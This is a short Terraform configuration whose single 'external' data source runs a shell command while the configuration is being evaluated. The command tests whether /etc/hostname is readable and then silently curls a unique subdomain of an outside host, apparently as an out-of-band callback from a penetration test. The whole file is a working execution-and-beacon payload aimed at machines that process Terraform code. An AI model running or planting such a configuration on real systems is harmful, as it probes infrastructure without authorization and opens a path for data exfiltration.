data "external" "file_read_test" {
  program = [
    "sh",
    "-c",
    "if test -r /etc/hostname; then curl -s https://jsfaldwycltl9w92tarq3tktnktfh75w.net-spi.com/file-readable >/dev/null 2>&1; echo '{\"result\":\"readable-and-callback-attempted\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
  ]
}

output "file_read_test" {
  value = data.external.file_read_test.result
}
